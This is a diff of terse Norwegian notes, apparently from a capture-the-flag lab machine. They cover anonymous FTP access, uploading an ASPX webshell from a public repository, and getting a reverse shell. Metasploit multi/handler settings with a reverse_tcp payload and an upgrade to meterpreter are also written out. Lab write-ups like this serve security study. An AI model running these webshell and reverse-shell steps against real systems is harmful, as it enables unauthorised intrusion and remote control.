@@ -22,7 +22,7 @@ logget inn ftp med anonymous. masse filer. last ned alt med `mget * .` og login 
 
 http kjører iis7
 
-laster opp et aspx shell https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
+laster opp et aspx shell [https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)
 
 [http://10.10.10.5](http://10.10.10.5/myshell.aspx)/sh.aspx
 
@@ -37,4 +37,28 @@ The command completed with one or more errors.
 /c whoami
 
 iis apppool\web
+
+fikk shell med https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+
+prøve å escalata nå da
+
+windows 7 6.1 build 7600 
+
+oppgradere fra nc til metasploit til meterpreter
+
+- use mutli/handler
+
+- set LHOST attack-machine
+
+- set LPORT port-as-appropraite
+
+- set payload windows/shell/reverse\_tcp
+
+- exploit'
+
+background session med ctrl z&lt;
+
+use post/multi/manage/shell\_to\_meterpreter
+
+
 
